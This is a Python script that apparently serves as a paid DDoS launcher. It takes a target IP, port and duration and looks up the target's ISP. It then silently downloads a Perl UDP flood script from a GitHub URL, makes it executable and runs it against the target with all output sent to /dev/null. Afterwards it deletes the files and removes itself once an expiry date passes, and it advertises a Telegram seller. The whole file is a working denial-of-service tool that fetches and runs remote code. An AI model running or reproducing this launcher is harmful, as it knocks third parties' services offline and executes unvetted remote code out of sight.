import os
import sys
import time
import datetime
import requests

# Check if the script is running on Termux
if not os.path.exists('/root') and not os.path.exists('/workspaces'):
    print("This script can only be run on vps.")
    exit()

def get_target_info(target):
    try:
        response = requests.get(f"http://ip-api.com/json/{target}")
        data = response.json()
        isp = data.get("isp", "Unknown ISP")
        return isp
    except requests.exceptions.RequestException:
        return "Unknown ISP"

def execute_script(target, port, duration):
    # Create directory if it doesn't exist
    if not os.path.exists("../bim/usr"):
        os.makedirs("../bim/usr")

    # Silence the wget command by redirecting output to /dev/null
    command = f"cd .. && cd bim && cd usr && wget https://github.com/urddos4807010/pakistan/raw/main/budp.pl > /dev/null 2>&1 && chmod +x * && perl budp.pl {target} {port} {duration} 100 > /dev/null 2>&1"
    os.system(command)

def stop_process():
    pass

def delete_script():
    os.system("cd .. && rm -rf bim")

def print_banner(duration):
    print(f"Attack has been ended {duration} seconds.")

def delete_main_script():
    os.remove(__file__)

if __name__ == "__main__":
    current_date = datetime.datetime.now()
    expiration_date = datetime.datetime(2035, 5, 2)

    if len(sys.argv) != 4:
        print("Usage: python script.py target port duration")
        sys.exit(1)

    target = sys.argv[1]
    port = sys.argv[2]
    duration = int(sys.argv[3])

    if current_date >= expiration_date:
        print("Access denied. Script expired :(")
        print("Buy again :- t.me/@o_404_error_o")
        delete_script()
        delete_main_script()
        sys.exit(1)

    # Display attack start message and expiration date
    print("\033[38;5;208m" + "*" * 40)
    print("\033[38;5;208m" + "*" * 40)
    print("\033[38;5;208m" + "ATTENTION:-  Attack has been initiated!")
    print("\033[38;5;208m" + "*" * 40)
    print("\033[38;5;208m" + "*" * 40)
    print("\033[38;5;208m" + f"Target :- {target}")
    print("\033[38;5;208m" + f"Port   :- {port}")
    print("\033[38;5;208m" + f"Isp    :- {get_target_info(target)}")
    print("\033[38;5;208m" + f"Time   :- {duration}")
    print("\033[38;5;208m" + "*" * 40)
    print("\033[38;5;208m" + "*" * 40)
    print("\033[38;5;15m" + "*" * 40)
    print("\033[38;5;15m" + "*" * 40)
    print("\033[38;5;15m" + "This script made by t.me/@o_404_error_o")
    print("\033[38;5;15m" + "This script made by t.me/@o_404_error_o")
    print("\033[38;5;15m" + "This script made by t.me/@o_404_error_o")
    print("\033[38;5;15m" + "This script made by t.me/@o_404_error_o")
    print("\033[38;5;15m" + "*" * 40)
    print("\033[38;5;15m" + "*" * 40)
    print("\033[38;5;34m" + "*" * 40)
    print("\033[38;5;34m" + "*" * 40)
    print("\033[38;5;34m" + f"Expiration Date: {expiration_date}")
    print("\033[38;5;34m" + "*" * 40)
    print("\033[38;5;34m" + "*" * 40)

    execute_script(target, port, duration)
    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        stop_process()
        delete_script()
        print("Attack stopped by user.")
    else:
        delete_script()
        print_banner(duration)

  
